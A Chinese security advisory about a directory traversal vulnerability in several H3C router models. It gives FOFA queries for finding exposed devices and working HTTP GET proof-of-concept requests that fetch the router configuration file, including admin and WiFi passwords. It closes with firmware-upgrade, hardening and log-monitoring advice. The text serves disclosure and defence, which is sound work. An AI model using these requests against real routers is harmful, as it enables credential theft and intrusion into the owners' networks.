---
title: 【漏洞复现】高危预警！H3C 多款路由器目录遍历漏洞致敏感信息泄露（附 POC + 修复方案）
url: https://mp.weixin.qq.com/s/A3lpycCUHbYXqpgIqG22xg
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:57:53.937467
---

# 【漏洞复现】高危预警！H3C 多款路由器目录遍历漏洞致敏感信息泄露（附 POC + 修复方案）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PcyHAMIicw37UP9Bqn8wlNDPVeb1RNKzSbyicdP2jMep8tMOQXZx6zAWibaJ42R4JjmwgoCG2SQeGzGBksRxSEEvjiaKDpLO2lyNSYwJAoUz5Ww/0?wx_fmt=jpeg)

# 【漏洞复现】高危预警！H3C 多款路由器目录遍历漏洞致敏感信息泄露（附 POC + 修复方案）

原创

xuzhiyang
xuzhiyang

玄武盾网络技术实验室

![]()

在小说阅读器中沉浸阅读

\*免责声明：本文仅供安全研究与学习之用，严禁使用本内容进行未经授权的违规渗透测试，遵守网络安全法，共同维护网络安全，违者后果自负。

## 01 — 漏洞名称

##

H3C 路由器目录遍历导致敏感信息泄露漏洞。

## 02 — 影响范围

##

本次漏洞涉及 H3C 多款企业级及消费级路由器，核心受影响型号包含：**ER6300G2、ER5200G2、GR2200、ER8300G2-X、H100**，同时 ER3200G2、ER3100G2、GR5200 等多款 ER/GR 系列型号也存在相同风险，覆盖企业办公、家庭组网等多类使用场景。

漏洞核心风险路径`/userLogin.asp`存在未授权访问缺陷，攻击者可通过路径穿越直接突破访问限制，获取设备核心配置信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PcyHAMIicw36Zu9GloYVVkWfPEzm7iaehibOibMG7D6HZQmbedafZfgdPc4D37fGStLDKDHA6eZCgXYngvPhTEuYKbqDMrLCL6b9OUS4QbtXSs0/640?wx_fmt=png&from=appmsg)

## 03 — 漏洞简介

##

H3C（新华三）路由器作为国内主流网络设备，广泛应用于中小企业、大型企业及家庭网络，凭借稳定的性能和丰富的管理功能成为组网首选。但本次发现的**目录遍历漏洞**，因设备 Web 管理端未对访问路径做严格的过滤与校验，导致攻击者可绕过身份验证机制。

通过构造特殊的访问路径，攻击者能直接读取路由器的核心配置文件，从中获取**后台管理账号密码、WiFi 名称及明文密码、设备端口配置、内网拓扑信息**等敏感内容。获取信息后，攻击者可直接登录路由器管理后台，篡改网络配置、开启非法远程管理，甚至进一步对内网进行横向渗透，窃取企业核心业务数据或家庭用户隐私，对网络安全造成全方位的威胁。

## 04 — 资产测绘

针对本次漏洞，可通过 FOFA 搜索引擎使用以下语法快速检索全网受影响资产，及时排查自身网络设备风险：

```
app="H3C-Ent-Router" && title=="ER6300G2系统管理"
```

![](https://mmbiz.qpic.cn/mmbiz_png/PcyHAMIicw343DQLPky9Nn319Q1sc5zCSSXwprFxkem9UD4NDricMD2jHnelr2ohyxmu4MapV1RThxMiahs35WvsAibQvSz6AhbHrbqmbYomlbA/640?wx_fmt=png&from=appmsg)

拓展测绘语法（覆盖 ER8300G2-X 等型号）：

```
app="H3C-Ent-Router" && title=="ER8300G2-X系统管理"
```

据最新测绘数据显示，全网已有超 2500 条独立 IP 匹配相关资产，主要分布在国内各省市及东南亚部分地区，其中企业级组网设备占比超 90%，漏洞暴露面极大，需立即开展排查。

## 05 — 漏洞复现（附 POC）

本次漏洞利用原理为**路径穿越**，攻击者通过`../`跳转路径，绕过`/userLogin.asp`的登录验证，直接访问路由器根目录下的配置文件，核心 POC 如下，支持 ER6300G2 等多款核心受影响型号：

### 核心 POC（ER6300G2 型号）

```
GET /userLogin.asp/../actionpolicy_status/../ER6300G2.cfg HTTP/1.1Host: 目标IPUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PcyHAMIicw35jwV3LvHlAvXoPgFicmAyvDSBHlQ7KgsMKibck2DoIp6GT04CibZSyxibWMaWrXMT1n9HMIjicQcyKfVWicXOLvuUzbgiclqWYMkVRbw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/PcyHAMIicw34YXvJIzqqaghNNuR0eKAqoiaRqC6bYUFibhchjBRvPu9lE9nGge2wXhoj0RXb0JfzicZWGDghIFCD3I8teibgIu8QPqgiaWCgQ7kf0/640?wx_fmt=png&from=appmsg)

其他型号适配 POC（ER8300G2-X）

```
GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg HTTP/1.1Host: 目标IPUser-Agent: Mozilla/5.0 (X11; CrOS aarch64 15236.9.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Connection: closeAccept-Encoding: gzip
```

### 复现结果

发送上述请求后，若目标设备存在漏洞，将返回**200 OK**状态码，同时响应内容包含设备完整配置文件（Content-length 通常为十几万字节），配置文件中可直接检索到`passwd`、`vtypasswd`等关键字段，获取明文 / 加密后的账号密码，以及 WiFi、端口映射等核心配置信息。

响应头特征：

```
HTTP/1.0 200 OKServer:H3C-Miniware-WebsContent-type: application/x-unknown;charset=GB2312Connection:close
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PcyHAMIicw36sb95XAhgODXrIIOXHxEiarASQCebJicOYtX3x8HHibBavjyicYiaViaLqNM33QJLdub31YleSmVI0wEicRibOSM14AfhJia5YHMYzvqia0/640?wx_fmt=jpeg)

##

## 06 — 应急修复建议

本次漏洞为设备固件层面的逻辑缺陷，无临时修复脚本，**优先通过固件升级实现彻底修复**，同时搭配安全配置加固，全方位降低风险，具体方案如下：

### 1. 立即升级固件至最新版本

* 核心受影响的 ERG2 系列（ER6300G2/ER5200G2 等）：升级至**ERHMG2-MNW100-R1125.bin**及以上版本；
* GR 系列（GR2200/GR5200 等）：升级至**MiniGR1B0V100R017.bin**及以上版本；
* 固件下载地址：H3C 官网【支持→软件下载→SMB 产品】，根据设备型号精准下载对应固件（官网地址：www.h3c.com）；
* 升级方式：通过路由器 WEB 管理后台【设备管理→软件升级→本地升级】，上传固件包完成升级，升级前建议备份设备配置。

### 2. 临时安全加固措施

在完成固件升级前，可通过以下配置降低漏洞被利用的风险：

* 关闭路由器**远程 WEB 管理**和**Telnet 管理**功能（默认关闭，若开启请立即关闭），仅保留内网本地管理；
* 将路由器管理 IP 修改为非网段常用 IP，避免暴露在公网，同时限制仅内网指定 IP 可访问管理后台；
* 及时修改路由器默认管理账号密码，设置为**字母 + 数字 + 特殊符号**的复杂密码，避免弱密码被破解。

### 3. 资产排查与监控

* 利用上述 FOFA 测绘语法，排查企业内网所有 H3C 路由器资产，建立设备台账，标记受影响型号；
* 对路由器访问日志进行监控，重点关注包含`/userLogin.asp`、`.cfg`等关键字的异常访问请求，及时发现攻击行为；
* 若发现设备已被非法访问，立即断开网络，重置路由器配置并升级固件，同时检查内网是否存在横向渗透痕迹。
* 随手点个「推荐」吧！

  ![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0knIjq7rj7rsX0r4Rf2CDQylx0IjMfpPM93icE9AGx28bqwDRau5EkcWpK6WBAG5zGDS41wkfcvJiaA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=5)

  声明：技术文章均收集于互联网，仅作为本人学习、记录使用。侵权删！！

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0mziaQHZpeFmLMjv20ORYp7tNnu8mx9vnmibRdltwkxDBjkcmDuYQRxTyba6J6wtVHL1ldhp5kD1ILQ/0?wx_fmt=png)

玄武盾网络技术实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0mziaQHZpeFmLMjv20ORYp7tNnu8mx9vnmibRdltwkxDBjkcmDuYQRxTyba6J6wtVHL1ldhp5kD1ILQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过